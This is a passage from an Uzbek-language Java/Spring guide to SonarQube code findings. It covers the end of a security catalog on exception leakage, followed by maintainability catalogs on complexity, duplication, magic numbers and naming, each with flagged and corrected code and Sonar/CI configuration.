Tavsiya: xavfsiz parser yasash bitta factory metodga yig'ilsin va XML o'qiydigan hamma joy shuni chaqirsin.

### 26.14 Istisno matnini foydalanuvchiga to'liq qaytarish

Stack trace va `SQLException` matni javobga tushsa, Sonar bir tomondan `java:S1148` bilan `printStackTrace` ga, boshqa tomondan debug rejimi hotspot iga shikoyat qiladi.

```java
// SHIKOYAT: ichki xato matni mijozga ketadi
@ExceptionHandler(Exception.class)
public ResponseEntity<String> handle(Exception e) {
    e.printStackTrace();
    return ResponseEntity.status(500).body(e.toString()); // sxema nomi chiqadi
}
```

Nega xavfli: PostgreSQL xatosi jadval va ustun nomini, cheklov nomini va ba'zan qiymatni aytadi.

```java
// TUZATILGAN: ichkariga log, tashqariga neytral javob va kuzatuv kodi
@ExceptionHandler(Exception.class)
public ProblemDetail handle(Exception e) {
    String traceId = UUID.randomUUID().toString();
    log.error("kutilmagan xato traceId={}", traceId, e); // to'liq matn faqat log da
    ProblemDetail pd = ProblemDetail.forStatus(HttpStatus.INTERNAL_SERVER_ERROR);
    pd.setDetail("So'rovni bajarib bo'lmadi. Kuzatuv kodi: " + traceId);
    return pd;
}
```

```properties
# prod da stack trace va xato xabari javobga qo'shilmaydi
server.error.include-stacktrace=never
server.error.include-message=never
server.error.include-binding-errors=never
spring.jpa.show-sql=false
```

Tavsiya: xato javobi faqat status, neytral matn va traceId dan iborat bo'lsin.

### 26.15 Oddiy yondashuv va arxitektor yondashuvi

| Savol | Oddiy yondashuv | Arxitektor yondashuvi |
| --- | --- | --- |
| Hotspot bilan nima qilish | Gate ni buzmaydi, e'tibor berilmaydi | Har bir hotspot review qilinadi va qarori izoh bilan yoziladi |
| Injection dan himoya | Kiritmani `replace` bilan tozalash | Parametrlangan so'rov, identifikator uchun oq ro'yxat |
| Maxfiy qiymatlar | `application.properties` ichida ochiq | Environment yoki vault, kodda faqat `${VAR}` |
| Zaiflik topilganda | Faqat shu qator tuzatiladi | Bir xil naqsh butun repoda qidiriladi va qoida qo'shiladi |
| Yangi endpoint | Ishlashi tekshiriladi | Default yopiq siyosat va avtorizatsiya testi yoziladi |
| TLS muammosi | Tekshiruv vaqtincha o'chiriladi | CA truststore ga qo'shiladi, kod o'zgarmaydi |
| Log | Hamma narsa `debug` da yoziladi | Maxfiy maydon maskalanadi, kiritma bir qatorga siqiladi |
| Gate sozlamasi | Default profil qoldiriladi | Yangi kodda nol vulnerability va nol ko'rilmagan hotspot talab qilinadi |

### 26.16 Tuzoq va yechim

| Tuzoq | Nima bo'ladi | Yechim |
| --- | --- | --- |
| Hotspot ni "won't fix" deb yopish | Haqiqiy zaiflik yashiradi | Faqat "safe" yoki "fixed" ishlatilsin, sabab yozilsin |
| Kalit kodda, keyin olib tashlangan | Git tarixida qoladi | Kalit almashtirilsin va tarix skaner bilan tekshirilsin |
| `?` o'rniga `String.format` | Sonar jim qoladi, injection qoladi | Formatlash emas, bind parametr ishlatilsin |
| Zaiflikni test bilan "yopish" | Coverage o'sadi, xavf qolaveradi | Oqim uzilsin, test esa uzilishni tasdiqlasin |
| Faqat controller da validatsiya | Servis boshqa yo'ldan chaqiriladi | Tekshiruv domen chegarasida ham turadi |
| Yangi kod uchun gate yo'q | Eski qarz yangisini yashiradi | New code shartlari alohida qattiq qo'yilsin |

### 26.17 Amalda qo'llash

- [ ] `Statement`, `createQuery` va `nativeQuery = true` joylarini qidirib, konkatenatsiya borlarini parametrga o'tkaz.
- [ ] `password`, `secret`, `token`, `key` nomli satr literallarini repoda qidirib, `${ENV_VAR}` ga chiqar va kalitni almashtir.
- [ ] `new Random()` va `Math.random()` chaqiruvlarini ko'rib chiq, xavfsizlik uchun bo'lsa `SecureRandom` ga o'tkaz.
- [ ] `MessageDigest` ishlatilgan joylarni tekshir, parol uchun bo'lsa `PasswordEncoder` ga ko'chir.
- [ ] XML o'qiydigan hamma nuqtani bitta xavfsiz factory metodga yig'ib, `disallow-doctype-decl` ni yoq.
- [ ] Security konfiguratsiyasida `anyRequest().authenticated()` oxirgi qator bo'lishini ta'minla va `permitAll` yo'llarini sanab chiq.
- [ ] `server.error.include-stacktrace=never` va `include-message=never` ni prod profilga qo'y, xato javobida traceId qaytar.
- [ ] Sonar da security hotspot ro'yxatini ochib, har bir ochiq hotspot ga review qarori va qisqa izoh yoz.

## 27. Xato katalogi: maintainability, tuzilish va murakkablik (Catalog: Maintainability, Structure)

Bu bob maintainability toifasidagi eng ko'p uchraydigan code smell larni katalog ko'rinishida yig'adi. Har bir holat uchun avval Sonar shikoyat qiladigan kod, keyin shikoyat sababi, keyin tuzatilgan variant beriladi. Misollar to'lov, buyurtma va hisobot servislari ustida qurilgan. Jiddiylik ustuni "taxminan", chunki uni quality profile belgilaydi.

| Kod holati | Sonar nima deydi | Toifa | Jiddiylik (taxminan) | Ta'siri |
| --- | --- | --- | --- | --- |
| Metodda cognitive complexity chegaradan oshdi (`java:S3776`) | "Refactor this method to reduce its Cognitive Complexity" | maintainability (code smell) | Critical | Metodni o'qish va test bilan qamrash qiyinlashadi |
| Metod juda uzun (`java:S138`) | "Metod ruxsat etilgan qatordan uzun" | maintainability (code smell) | Major | Bitta metod bir nechta mas'uliyatni ushlab turadi |
| Klass yoki fayl juda uzun | "Fayl ruxsat etilgan qatordan uzun" (fayl uzunligi qoidasi) | maintainability (code smell) | Major | Klass God Object ga aylanadi |
| Parametrlar soni ko'p (`java:S107`) | "Metodda 7 dan ko'p parametr bor" | maintainability (code smell) | Major | Chaqiruv joyida argument almashib ketadi |
| Nazorat strukturalari chuqur ichma-ich (`java:S134`) | "Uch darajadan chuqur joylashtirma" | maintainability (code smell) | Critical | Shart kombinatsiyalari ko'rinmay qoladi |
| Birlashtirilishi mumkin bo'lgan `if` lar (`java:S1066`) | "Merge this if statement with the enclosing one" | maintainability (code smell) | Major | Ortiqcha ichma-ich daraja, keraksiz murakkablik |
| Bo'sh blok (`java:S108`) | "Either remove or fill this block of code" | maintainability (code smell) | Major | Yozilmagan mantiq yo'q bo'lib ketadi |
| Bo'sh `catch` va yo'q qilingan exception | "Handle this exception or rethrow it" | maintainability (code smell) | Major | Xato jim yutiladi, incident tahlili imkonsiz |
| Takrorlangan kod bloki (duplication metrikasi) | "Duplicated Blocks" o'sadi, quality gate shartiga tegadi | maintainability (o'lchov) | Quality gate sharti | Tuzatish bir joyda qilinadi, boshqasida qolib ketadi |
| Takrorlangan satr literali (`java:S1192`) | "Literal takrorlanmasin, konstanta kirit" | maintainability (code smell) | Critical | Matn yoki kalit bir joyda o'zgaradi, boshqasida yo'q |
| Magic number (`java:S109`) | "Assign this magic number to a well-named constant" | maintainability (code smell) | Major | Raqamning ma'nosi faqat muallif xotirasida qoladi |
| Darhol qaytariladigan mahalliy o'zgaruvchi (`java:S1488`) | "Ifodani darhol qaytar" | maintainability (code smell) | Minor | Shovqin, o'qishga qo'shimcha qadam |
| Ishlatilmaydigan qiymat berish (`java:S1854`) | "Remove this useless assignment to local variable" | maintainability (code smell) | Major | O'quvchini chalg'itadi, bug ni yashiradi |
| Boolean ifodani `if/else` bilan qaytarish (`java:S1126`) | "Bitta return bilan almashtir" | maintainability (code smell) | Minor | Oddiy mantiq uch barobar uzun yoziladi |
| Ichma-ich ternar operator (`java:S3358`) | "Ichma-ich ternarni ajratib ol" | maintainability (code smell) | Major | Ifoda bir qarashda noto'g'ri o'qiladi |
| `switch` da `default` yo'q | "Add a default case to this switch" (default branch qoidasi) | maintainability (code smell) | Critical | Yangi enum qiymati jim o'tib ketadi |
| Umumiy `Exception` ni tashlash (`java:S112`) | "Maxsus exception tashla" | maintainability (code smell) | Major | Chaqiruvchi xato turini ajrata olmaydi |

### 27.1 Cognitive complexity chegarasidan oshgan metod

Sonar cyclomatic complexity dan tashqari cognitive complexity ni ham hisoblaydi. Har bir shart, tsikl va `catch` ball qo'shadi, ichma-ich joylashuv esa ballni ko'paytirib yuboradi. Java uchun standart chegara metodga 15 ball, bu profile da o'zgartiriladi.

```java
// Sonar shikoyati: Cognitive Complexity 19, ruxsat etilgani 15
public PaymentResult charge(Order order, Card card) {
    if (order != null) {
        if (order.isPaid()) {
            return PaymentResult.alreadyPaid();
        } else {
            if (card.isExpired()) {
                return PaymentResult.rejected("CARD_EXPIRED");
            } else {
                if (order.total().compareTo(card.limit()) > 0) {
                    return PaymentResult.rejected("LIMIT");
                } else {
                    for (Fee fee : order.fees()) {
                        if (fee.isRefundable() && !fee.isApplied()) {
                            applyFee(order, fee);
                        }
                    }
                    return gateway.charge(order, card);
                }
            }
        }
    }
    return PaymentResult.rejected("NO_ORDER");
}
```

Tuzatish yo'li: guard clause bilan darajani yo'qotish va tsiklni metodga chiqarish.

```java
// Cognitive Complexity 4 ga tushdi, har bir qism alohida test qilinadi
public PaymentResult charge(Order order, Card card) {
    if (order == null) return PaymentResult.rejected("NO_ORDER");
    if (order.isPaid()) return PaymentResult.alreadyPaid();
    if (card.isExpired()) return PaymentResult.rejected("CARD_EXPIRED");
    if (exceedsLimit(order, card)) return PaymentResult.rejected("LIMIT");
    applyRefundableFees(order);
    return gateway.charge(order, card);
}

private void applyRefundableFees(Order order) {
    order.fees().stream()
        .filter(fee -> fee.isRefundable() && !fee.isApplied())
        .forEach(fee -> applyFee(order, fee));
}
```

Issue ni lokal ko'rish uchun bitta modulni skanerlash yetadi.

```bash
# faqat to'lov modulini skanerlab, cognitive complexity issue larini ko'rish
./mvnw -pl payment-service -am clean verify sonar:sonar \
  -Dsonar.host.url=http://localhost:9000 \
  -Dsonar.login="$SONAR_TOKEN"
```

Tavsiya: cognitive complexity ni refactoring uchun signal deb qabul qil, chegarani ko'tarib issue ni o'chirma.

### 27.2 Juda uzun metod va juda uzun klass

Uzunlik qoidasi faqat qator sanaydi, lekin ko'pincha to'g'ri joyni ko'rsatadi. Hisobot servisidagi uzun metod odatda yig'ish, hisoblash va formatlashni bir joyda bajaradi.

```java
// Sonar shikoyati: metod 140 qator, ruxsat etilgani odatda 75
public byte[] buildMonthlyReport(int year, int month) {
    List<Order> orders = jdbc.query("select ...", rowMapper); // SQL kod ichida
    BigDecimal revenue = BigDecimal.ZERO;
    // ... 40 qator agregatsiya
    // ... 50 qator Excel yacheykalarini to'ldirish
    // ... 30 qator fayl nomini yasash va log yozish
    return bytes;
}
```

Yechim: so'rovni repository ga, agregatsiyani domain klassga, formatlashni alohida writer ga ko'chirish.

```java
// har bir qadam alohida tiplangan, metod 6 qator
public byte[] buildMonthlyReport(ReportPeriod period) {
    List<OrderRow> rows = reportRepository.findOrderRows(period);
    RevenueSummary summary = RevenueSummary.from(rows);
    return excelWriter.write(summary);
}
```

So'rov repository ga chiqqach, SQL ni optimallashtirish osonlashadi.

```sql
-- hisobot uchun agregatsiya bazada bajariladi, Java da emas
select o.status, count(*) as order_count, sum(o.total_amount) as revenue
from orders o
where o.created_at >= :period_start and o.created_at < :period_end
group by o.status;
```

Tavsiya: uzunlik issue sini qator kesib emas, mas'uliyatni ajratib yo'q qil.

### 27.3 Parametrlar soni ko'p metod

Standart chegara 7 parametr. Bunday metodda argumentlar joyi almashsa, kompilyator ham ushlamaydi.

```java
// Sonar shikoyati: 9 parametr, ruxsat etilgani 7
public Payment create(Long orderId, String currency, BigDecimal amount,
                      String cardToken, String payerEmail, String ip,
                      boolean threeDs, String idempotencyKey, String note) {
    // ...
}
```

Parametrlarni ma'noli record ga yig'ish kerak.

```java
// chaqiruv joyi o'qiladigan bo'ldi, yangi maydon qo'shish signaturani buzmaydi
public record PaymentRequest(Long orderId, Money amount, CardData card,
                             PayerContext payer, String idempotencyKey) {}

public Payment create(PaymentRequest request) {
    // ...
}
```

Tavsiya: uchdan ortiq parametr paydo bo'lsa, ularni domain tushunchasi sifatida nomlab record ga yig'.

### 27.4 Ichma-ich joylashgan shartlar va chuqur bloklar

Sonar nazorat strukturalari chuqurligini alohida sanaydi, standart chegara uch daraja. Chuqur blok cognitive complexity ni ham oshiradi, ya'ni bitta joy ikki issue beradi.

```java
// Sonar shikoyati: 4 daraja ichma-ich nazorat strukturasi
for (OrderLine line : order.lines()) {
    if (line.quantity() > 0) {
        if (stock.has(line.sku())) {
            if (!line.isReserved()) {
                reserve(line);
            }
        }
    }
}
```

Shartlarni teskari o'girib `continue` bilan chiqib ketish darajani bitta qoldiradi.

```java
// bitta daraja, har bir shart o'z nomini oldi
for (OrderLine line : order.lines()) {
    if (!isReservable(line)) continue;
    reserve(line);
}

private boolean isReservable(OrderLine line) {
    return line.quantity() > 0 && stock.has(line.sku()) && !line.isReserved();
}
```

Tavsiya: tsikl ichidagi shartlar zanjirini nomlangan predikat metodga chiqar.

### 27.5 Birlashtirish mumkin bo'lgan ketma-ket `if` lar

Agar ichki `if` da `else` bo'lmasa va u tashqi blokdagi yakka operator bo'lsa, Sonar ikki shartni birlashtirishni talab qiladi.

```java
// Sonar shikoyati: bu if ni tashqi if bilan birlashtir
if (order.isConfirmed()) {
    if (order.total().signum() > 0) {
        invoiceService.issue(order);
    }
}
```

```java
// bitta shart, o'qish uchun bir daraja kamaydi
if (order.isConfirmed() && order.total().signum() > 0) {
    invoiceService.issue(order);
}
```

Tavsiya: birlashtirilgan shart uzayib ketsa, uni `&&` bilan qoldirmay nomlangan metodga ol.

### 27.6 Bo'sh blok va bo'sh `catch`

Bo'sh blok qoidasi `if`, `for`, `while` bloklariga tegadi. Bo'sh `catch` alohida qoida bilan ushlanadi va incident tahliliga ham zarar beradi.

```java
// Sonar shikoyati: bo'sh blok va yutilgan exception
try {
    gateway.charge(order);
} catch (GatewayException e) {
}
if (order.isPaid()) {
}
```

Har bir exception uchun qaror kerak: qayta tashlash, kompensatsiya yoki hech bo'lmasa log.

```java
// xato kontekst bilan qayta tashlanadi, blok esa butunlay olib tashlandi
try {
    gateway.charge(order);
} catch (GatewayException e) {
    throw new PaymentFailedException(order.id(), e);
}
```

Tavsiya: exception ni atay yutish kerak bo'lsa, sababini izohda yozib `log.debug` qoldir.

### 27.7 Takrorlangan kod bloki

Duplication qoida emas, metrika. Sonar o'xshash token ketma-ketligini topib `Duplicated Lines (%)` ni hisoblaydi, quality gate esa odatda yangi kod uchun 3 foiz chegara qo'yadi.

```java
// Sonar shikoyati: bu ikki metodda takrorlangan blok bor
public void payOrder(Order o) {
    if (o == null) throw new IllegalArgumentException("order is null");
    if (o.isCancelled()) throw new IllegalStateException("cancelled");
    audit.log("PAY", o.id());
    gateway.charge(o);
}

public void refundOrder(Order o) {
    if (o == null) throw new IllegalArgumentException("order is null");
    if (o.isCancelled()) throw new IllegalStateException("cancelled");
    audit.log("REFUND", o.id());
    gateway.refund(o);
}
```

Umumiy qismni template metodga chiqaramiz.

```java
// tekshirish va audit bir joyda, farq faqat harakatda
private void withValidOrder(Order o, String action, Consumer<Order> op) {
    if (o == null) throw new IllegalArgumentException("order is null");
    if (o.isCancelled()) throw new IllegalStateException("cancelled");
    audit.log(action, o.id());
    op.accept(o);
}
```

Generatsiya qilingan kodni duplication hisobidan chiqarib tashla.

```properties
# generatsiya qilingan va migratsiya fayllari duplication hisobiga kirmasin
sonar.cpd.exclusions=**/generated/**,**/*MapperImpl.java
sonar.exclusions=**/db/migration/**
sonar.java.source=21
```

Tavsiya: duplication ni exclusion bilan yashirishdan avval, blok haqiqatan umumiy mantiq emasligiga ishonch hosil qil.

### 27.8 Takrorlangan satr literali

Bir xil satr literali uch martadan ko'p takrorlansa, Sonar konstanta talab qiladi. Chegara qoida parametri bilan sozlanadi.

```java
// Sonar shikoyati: "PAYMENT_FAILED" literali 4 marta takrorlangan
if (status.equals("PAYMENT_FAILED")) metrics.inc("PAYMENT_FAILED");
if (prev.equals("PAYMENT_FAILED")) audit.log("PAYMENT_FAILED", id);
```

```java
// bitta manba, nomi o'z ma'nosini aytib turadi
private static final String PAYMENT_FAILED = "PAYMENT_FAILED";

if (PAYMENT_FAILED.equals(status)) metrics.inc(PAYMENT_FAILED);
```

Tavsiya: status va xato kodlari uchun satr emas, enum ishlat, shunda qoida ham, kompilyator ham yordam beradi.

### 27.9 Magic number va uni konstantaga chiqarish

Kod ichidagi tushuntirilmagan raqam uchun Sonar nomlangan konstanta so'raydi. `-1`, `0`, `1` kabi qiymatlar odatda istisno qilinadi.

```java
// Sonar shikoyati: 0.02 va 86400 nimani bildiradi, tushunarsiz
BigDecimal fee = amount.multiply(new BigDecimal("0.02"));
if (secondsSincePayment > 86400) markAsSettled(payment);
```

```java
// raqam nomini oldi, biznes qoidasi o'qiladigan bo'ldi
private static final BigDecimal GATEWAY_FEE_RATE = new BigDecimal("0.02");
private static final Duration SETTLEMENT_WINDOW = Duration.ofDays(1);

BigDecimal fee = amount.multiply(GATEWAY_FEE_RATE);
if (sincePayment.compareTo(SETTLEMENT_WINDOW) > 0) markAsSettled(payment);
```

Tavsiya: konstanta nomida qiymatni emas, biznes ma'nosini yoz, masalan `GATEWAY_FEE_RATE`.

### 27.10 Ortiqcha mahalliy o'zgaruvchi va darhol qaytariladigan qiymat

Ikki qoida bor: darhol qaytariladigan o'zgaruvchi va hech qachon o'qilmaydigan qiymat berish. Ikkinchisi xavfliroq, chunki u ko'pincha haqiqiy bug ni yashiradi.

```java
// Sonar shikoyati: natija darhol qaytariladi, total esa hech qachon o'qilmaydi
public BigDecimal total(Order order) {
    BigDecimal total = BigDecimal.ZERO;
    BigDecimal result = order.lines().stream()
        .map(OrderLine::amount).reduce(BigDecimal.ZERO, BigDecimal::add);
    return result;
}
```

```java
// ortiqcha o'zgaruvchilar yo'q, ifoda to'g'ridan to'g'ri qaytariladi
public BigDecimal total(Order order) {
    return order.lines().stream()
        .map(OrderLine::amount)
        .reduce(BigDecimal.ZERO, BigDecimal::add);
}
```

Tavsiya: ishlatilmaydigan qiymat berish issue sini o'chirishdan oldin, u yerda yo'qolgan mantiq yo'qligini tekshir.

### 27.11 Keraksiz `else` va erta qaytish bilan soddalashtirish

`return` dan keyingi `else` va boolean ifodani `if/else` bilan qaytarish alohida qoidalar bilan belgilanadi.

```java
// Sonar shikoyati: bu if-then-else ni bitta return bilan almashtir
public boolean isRefundable(Payment p) {
    if (p.isSettled() && !p.isDisputed()) {
        return true;
    } else {
        return false;
    }
}
```

```java
// shart o'zi javob, qo'shimcha shoxlanish yo'q
public boolean isRefundable(Payment p) {
    return p.isSettled() && !p.isDisputed();
}
```

Tavsiya: validatsiya qadamlarini guard clause bilan boshida qaytar, asosiy mantiqni `else` ichida saqlama.

### 27.12 Ternar operatorlarni ichma-ich joylash

Ichma-ich ternar ifodani o'qishda xato qilish ehtimoli yuqori, shuning uchun Sonar alohida qoida beradi.

```java
// Sonar shikoyati: ichma-ich ternar operatorni alohida ifodaga chiqar
String label = p.isPaid() ? "PAID"
    : p.isPending() ? (p.isDisputed() ? "DISPUTED" : "PENDING")
    : "FAILED";
```

```java
// qarorlar switch da ko'rinadi, har bir shoxni test qilish oson
String label = switch (p.state()) {
    case PAID -> "PAID";
    case PENDING -> p.isDisputed() ? "DISPUTED" : "PENDING";
    case FAILED -> "FAILED";
};
```

Tavsiya: bitta daraja ternar qoldir, ikkinchi darajaga ehtiyoj tug'ilsa `switch` yoki metodga o't.

### 27.13 `switch` da `default` yo'qligi va qamrab olinmagan holat

Sonar `switch` barcha holatni qamrab olishini talab qiladi. Eski uslubdagi `switch` da `default` yetishmasa issue tushadi, `switch` expression da esa kompilyator o'zi talab qiladi.

```java
// Sonar shikoyati: default branch yo'q, yangi enum qiymati jim o'tadi
switch (order.status()) {
    case NEW: reserveStock(order); break;
    case PAID: ship(order); break;
    case CANCELLED: releaseStock(order); break;
}
```

```java
// barcha holat qamrab olingan, kutilmagan qiymat aniq xato beradi
switch (order.status()) {
    case NEW -> reserveStock(order);
    case PAID -> ship(order);
    case CANCELLED -> releaseStock(order);
    default -> throw new IllegalStateException("Noma'lum status: " + order.status());
}
```

Tavsiya: enum ustidagi `switch` ni expression shaklida yoz, shunda yangi qiymat qo'shilganda build buziladi.

### 27.14 Umumiy `Exception` ni ushlash yoki tashlash

`Exception` yoki `Throwable` ni tashlash uchun bitta qoida, ularni ushlash uchun boshqasi ishlaydi. Ikkisi ham chaqiruvchidan xatoni ajratish imkonini tortib oladi.

```java
// Sonar shikoyati: umumiy exception tashlanadi va umumiy exception ushlanadi
public void settle(Payment p) throws Exception {
    try {
        gateway.settle(p);
    } catch (Exception e) {
        log.error("xato", e);
    }
}
```

```java
// aniq tip tashlanadi, faqat kutilgan xato ushlanadi
public void settle(Payment p) throws SettlementException {
    try {
        gateway.settle(p);
    } catch (GatewayTimeoutException e) {
        throw new SettlementException(p.id(), e);
    }
}
```

Tavsiya: har bir texnik xatoni domain xatosiga o'rab tashla, `catch (Exception e)` ni faqat eng tashqi chegarada qoldir.

### 27.15 Oddiy yondashuv va arxitektor yondashuvi

| Holat | Oddiy yondashuv | Arxitektor yondashuvi |
| --- | --- | --- |
| Cognitive complexity issue | Chegarani profile da 25 ga ko'taradi | Metodni bo'lib, chegarani tegmasdan qoldiradi |
| Uzun metod | Qatorlarni qisqartirib bir satrga yig'adi | Mas'uliyatni ajratib alohida klassga chiqaradi |
| Ko'p parametr | Oxirgi parametrlarni `Map` ga tiqadi | Domain record kiritadi va tiplashni kuchaytiradi |
| Duplication | `sonar.cpd.exclusions` ga qo'shadi | Umumiy mantiqni ajratadi, exclusion faqat generatsiya uchun |
| Takrorlangan literal | `NOSONAR` izohi qo'yadi | Enum yoki konstanta kiritadi |
| Magic number | Izoh yozib qoldiradi | Nomlangan konstanta va birlik tipini kiritadi |
| Bo'sh `catch` | `e.printStackTrace()` qo'shib issue ni yopadi | Xatoni domain exception ga o'rab qayta tashlaydi |
| `switch` da `default` yo'q | `default: break;` yozadi | `switch` expression ga o'tib, kutilmagan holatni xato qiladi |
| Issue oqimi | Oyda bir marta ko'p issue ni yopadi | Yangi kod shartini CI da majburiy qiladi, qarz o'smaydi |

### 27.16 Tuzoq va yechim

| Tuzoq | Nega xavfli | Yechim |
| --- | --- | --- |
| `// NOSONAR` ni ommaviy ishlatish | Issue yo'qoladi, muammo qoladi | Faqat sababi izohlangan yakka holatda, review bilan |
| Chegaralarni issue yo'qolgunicha ko'tarish | Quality gate ma'nosini yo'qotadi | Chegarani qattiq qoldirib, yangi kodga shart qo'yish |
| Butun modulni `sonar.exclusions` ga kiritish | Modul o'lchovsiz qoladi | Faqat generatsiya qilingan kodni chiqarish |
| Code smell larni bug bilan bir navbatda ko'rish | Reliability issue lari kechikadi | Toifa bo'yicha ajratib, bug va vulnerability ni oldin yopish |
| Refactoring ni testsiz boshlash | Xulq o'zgarib ketadi, Sonar sezmaydi | Avval mavjud xulqni test bilan qulflash, keyin bo'lish |
| Faqat lokal scan ga ishonish | Branch va quality gate holati ko'rinmaydi | CI da scan va gate natijasini majburiy qadam qilish |

Chegaralarni loyihada bir marta mahkamlab qo'y, shunda hamma bir xil natija oladi.

```xml
<!-- scan konfiguratsiyasi pom.xml da turadi, lokal va CI bir xil ishlaydi -->
<properties>
  <sonar.projectKey>payment-service</sonar.projectKey>
  <sonar.java.source>21</sonar.java.source>
  <sonar.cpd.exclusions>**/generated/**</sonar.cpd.exclusions>
  <sonar.coverage.jacoco.xmlReportPaths>
    ${project.build.directory}/site/jacoco/jacoco.xml
  </sonar.coverage.jacoco.xmlReportPaths>
</properties>
```

CI da gate natijasini kutish kerak, aks holda build yashil, gate esa qizil qoladi.

```yaml
# gate natijasini kutmasa, CI yashil bo'lib code smell o'tib ketadi
- name: Sonar scan va gate
  run: |
    ./mvnw -B clean verify sonar:sonar \
      -Dsonar.qualitygate.wait=true
  env:
    SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
```

### 27.17 Amalda qo'llash

- [ ] To'lov, buyurtma va hisobot servislaridagi cognitive complexity issue larini ro'yxatga olib, eng yuqori ballli uchta metodni guard clause bilan bo'l.
- [ ] Yetti va undan ko'p parametrli metodlarni topib, har birini domain record ga aylantir.
- [ ] Barcha bo'sh `catch` bloklarini ko'rib chiq va har birini domain exception ga o'rab qayta tashla.
- [ ] Uch martadan ko'p takrorlangan status literallarini enum ga ko'chir, konstantani bitta joyda qoldir.
- [ ] `sonar.cpd.exclusions` va `sonar.exclusions` ro'yxatini tozalab, faqat generatsiya qilingan kodni qoldir.
- [ ] Eski uslubdagi enum `switch` larni `switch` expression ga o'tkaz va kutilmagan qiymatga xato tashla.
- [ ] CI pipeline ga `-Dsonar.qualitygate.wait=true` qo'shib, gate qizil bo'lsa build yiqilishini ta'minla.
- [ ] Refactoring dan oldin mavjud xulqni test bilan qulfla, testlash qo'llanmasidagi xulq-markazli test mavzusiga tayan.

## 28. Xato katalogi: maintainability, nomlash, o'lik kod va uslub (Catalog: Maintainability, Naming)

Bu bob Sonar hisobotida eng ko'p uchraydigan, lekin eng arzon tuzatiladigan shikoyatlar katalogi. Bu yerdagi deyarli hamma narsa `maintainability` toifasiga tushadi, ya'ni code smell, va ko'pchiligi dastur ishlashiga bugun ta'sir qilmaydi. Shuning uchun ularni e'tiborsiz qoldirish oson, keyin esa ular technical debt ratio va `Maintainability Rating` orqali quality gate ni yiqitadi. Katalog Spring servis va repository klasslari ustida qurilgan, chunki real loyihada bu shikoyatlarning asosiy qismi aynan shu ikki qatlamda yig'iladi.

| Kod holati | Sonar nima deydi | Toifa | Jiddiylik (taxminan) | Ta'siri |
|---|---|---|---|---|
| `class payment_service` | klass nomi nomlash shablonga mos emas (`java:S101`) | maintainability | minor | Kod bazasi bo'ylab nom izlash qiyinlashadi |
| `void Process_Payment()` | metod nomi shablonga mos emas (`java:S100`) | maintainability | minor | IDE va code review da shovqin |
| `static final int maxRetry` | konstanta nomi shablonga mos emas (`java:S115`) | maintainability | minor | Konstanta o'zgaruvchidan ajralmaydi |
| `private String Customer_Id` | maydon nomi shablonga mos emas (`java:S116`) | maintainability | minor | Qatlamlar orasida uslub buziladi |
| `BigDecimal s = ...` | mahalliy o'zgaruvchi va parametr nomi shablonga mos emas (`java:S117`) | maintainability | minor | Mantiqni o'qish sekinlashadi |
| Ishlatilmagan `import` | keraksiz import o'chirilishi kerak (`java:S1128`) | maintainability | minor | Soxta bog'liqlik, kompilyatsiya shovqini |
| Ishlatilmagan `private` maydon | foydalanilmagan private maydon (`java:S1068`) | maintainability | major | O'quvchi uni ishlatilayotgan deb o'ylaydi |
| Ishlatilmagan metod parametri | foydalanilmagan parametr (`java:S1172`) | maintainability | major | Chaqiruvchi noto'g'ri shartnoma ko'radi |
| Ishlatilmagan mahalliy o'zgaruvchi | qiymat o'qilmaydi (`java:S1481`) | maintainability | major | Yashirin mantiqiy xato alomati |
| Ishlatilmagan `private` metod | o'lik kod (`java:S1144`) | maintainability | major | Qo'llab-quvvatlash va test yuki |
| Kommentariyaga olingan kod | kommentdagi kod o'chirilsin (`java:S125`) | maintainability | major | Qaysi variant to'g'ri ekani bilinmaydi |
| `// TODO` izohi | bajarilmagan ish belgisi (`java:S1135`) | maintainability | info | Debt ko'rinmas bo'lib qoladi |
| `// FIXME` izohi | tuzatilmagan nuqson belgisi (`java:S1134`) | maintainability | major | Ma'lum xato release ga ketadi |
| Eskirgan API chaqiruvi | deprecated element ishlatilgan (`java:S1874`) | maintainability | major | Keyingi major versiyada kod buziladi |
| `public BigDecimal balance` | maydon public bo'lmasligi kerak (`java:S1104`) | maintainability | major | Invariantni hech kim himoya qilmaydi |
| `public static Map CACHE` | public static o'zgaruvchan maydon (`java:S2386`) | maintainability (ba'zi profilda vulnerability) | critical | Tashqaridan holatni buzish mumkin |
| Konstruktorda bir marta beriladigan maydon `final` emas | o'zgarmas maydon `final` bo'lsin | maintainability | minor | Tasodifiy qayta tayinlash xavfi |
| Interfeysda `public abstract` | ortiqcha modifikator (`java:S2333`) | maintainability | minor | Shovqin, uslub nomuvofiqligi |
| Sikl ichida `str += x` | siklda satr birlashtirish (`java:S1643`) | maintainability | major | O(n^2) xotira va vaqt |
| `log.debug("id=" + id)` | argument har safar hisoblanadi (`java:S2629`) | maintainability | major | O'chirilgan log darajasida ham CPU sarfi |
| `name.toString()` | `String` ustida `toString()` (`java:S1858`) | maintainability | minor | Ma'nosiz chaqiruv, noto'g'ri tasavvur |
| `"x" + String.valueOf(n)` | ortiqcha `String.valueOf` (`java:S1153`) | maintainability | minor | Kod shovqini |
| Ikki metod bir xil tanaga ega | identik implementatsiya (`java:S4144`) | maintainability | major | Tuzatish bitta joyda qoladi |

### 28.1 Nomlash shabloniga mos kelmaydigan klass, metod, maydon va konstanta

Sonar nomlashni to'rtta alohida qoida bilan tekshiradi va har biri o'z regex parametriga ega. Klass uchun `java:S101`, metod uchun `java:S100`, konstanta uchun `java:S115`, oddiy maydon uchun `java:S116`, mahalliy o'zgaruvchi va parametr uchun `java:S117`. Shikoyat qilinadigan servis odatda shunday ko'rinadi.

```java
// Sonar: bitta klassda beshta nomlash qoidasi buzilgan
@Service
public class payment_service {                      // java:S101

    private static final int maxRetry = 3;          // java:S115

    private String Customer_Id;                     // java:S116

    public void Process_Payment(long Order_Id) {    // java:S100 va java:S117
        int Attempt = 0;                            // java:S117
        while (Attempt < maxRetry) {
            Attempt++;
        }
    }
}
```

Bu qoidalar kompilyatsiyaga ham, ishlashga ham ta'sir qilmaydi. Ular jamoaning kod o'qish tezligi uchun muhim. Regex standart holatda Java konvensiyasini talab qiladi: klass `PascalCase`, metod va maydon `camelCase`, `static final` konstanta `UPPER_SNAKE_CASE`.

```java
@Service
public class PaymentService {

    private static final int MAX_RETRY_COUNT = 3;   // konstanta: UPPER_SNAKE_CASE

    private String customerId;                      // maydon: camelCase

    public void processPayment(long orderId) {      // metod: camelCase
        int attempt = 0;
        while (attempt < MAX_RETRY_COUNT) {
            attempt++;
        }
    }
}
```

